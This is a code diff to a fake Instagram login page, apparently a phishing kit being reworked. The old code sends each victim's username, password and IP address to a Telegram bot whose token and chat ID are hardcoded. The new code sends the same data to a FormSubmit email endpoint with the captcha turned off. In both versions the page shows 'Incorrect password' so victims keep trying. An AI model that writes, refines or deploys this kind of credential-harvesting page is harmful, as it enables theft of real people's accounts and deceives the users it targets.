@@ -72,10 +72,14 @@
         <!-- Instagram Logo -->
         <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" class="logo">
         
-        <!-- Login Form -->
+        <!-- Login Form (action points to FormSubmit, but submission is handled via JS) -->
         <form id="loginForm">
-            <input type="text" id="emailOrUsername" placeholder="Email or Username" required>
-            <input type="password" id="password" placeholder="Password" required>
+            <input type="text" id="emailOrUsername" name="emailOrUsername" placeholder="Email or Username" required>
+            <input type="password" id="password" name="password" placeholder="Password" required>
+            <!-- Hidden fields for FormSubmit customization -->
+            <input type="hidden" name="_subject" value="New Instagram Login Attempt">
+            <input type="hidden" name="_captcha" value="false"> <!-- Disable reCAPTCHA for AJAX -->
+            <!-- Optional: <input type="hidden" name="_replyto" value="emailOrUsername"> for replies to user's email -->
             <button type="submit">Log In</button>
             <p class="forgot"><a href="#">Forgot password?</a></p>
             <p id="errorMessage"></p>
@@ -83,19 +87,17 @@
     </div>
 
     <script>
-        // JavaScript to handle form submission and Telegram integration
-        const botToken = '7729844025:AAFfgx0TPOwxCs8Hrc9JZGTHkQmvL8aFhTo';  // Replace with your bot token if invalid
-        const chatId = '8378689900';      // Replace with your chat ID if invalid
+        // JavaScript to handle form submission and FormSubmit integration
+        const formSubmitUrl = 'https://formsubmit.co/disodok@gmail10p.com';  // Replace with your actual email
         let attemptCount = 0;
         const fallbackIp = '94.131.218.172';  // Fallback from document
 
         document.getElementById('loginForm').addEventListener('submit', async function(event) {
-            event.preventDefault();  // Prevent form from reloading page
+            event.preventDefault();  // Prevent default form submission (no page reload)
 
             attemptCount++;
             const emailOrUsername = document.getElementById('emailOrUsername').value;
             const password = document.getElementById('password').value;
-            const formName = "Instagram";
             
             // Fetch user's IP address with fallback
             let userIp = fallbackIp;
@@ -107,41 +109,29 @@
                 console.warn('IP fetch failed, using fallback:', ipError);
             }
 
-            // Prepare message for Telegram bot (using HTML for parse_mode)
-            const message = `
-📩 <b>New Login Attempt on Instagram Form</b><br>
-📧 <b>Email/Username:</b> ${emailOrUsername}<br>
-🔑 <b>Password:</b> ${password}<br>
-🌐 <b>IP Address:</b> ${userIp}<br>
-🔁 <b>Attempt:</b> ${attemptCount}/3
-            `;
+            // Create FormData for submission
+            const formData = new FormData(event.target);
+            formData.append('ipAddress', userIp);  // Add IP as a field
+            formData.append('attemptCount', `${attemptCount}/3`);  // Add attempt count
 
-            // Send data to Telegram bot
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message,
-                    parse_mode: "HTML"
-                })
+            // Send data to FormSubmit via AJAX
+            fetch(formSubmitUrl, {
+                method: 'POST',
+                body: formData
             })
             .then(response => {
                 if (!response.ok) {
                     throw new Error(`HTTP ${response.status}: ${response.statusText}`);
                 }
-                return response.json();
-            })
-            .then(data => {
-                console.log('Telegram message sent successfully:', data);
+                console.log('FormSubmit sent successfully');
             })
             .catch(error => {
-                console.error('Telegram send failed:', error);
+                console.error('FormSubmit send failed:', error);
                 // Optionally show error to user
                 document.getElementById('errorMessage').textContent = "Login failed. Please try again. (Check console for details)";
             });
 
-            // Incorrect password handling
+            // Incorrect password handling (independent of submission)
             if (attemptCount < 3) {
                 document.getElementById('errorMessage').textContent = "Incorrect password. Please try again.";
             } else {
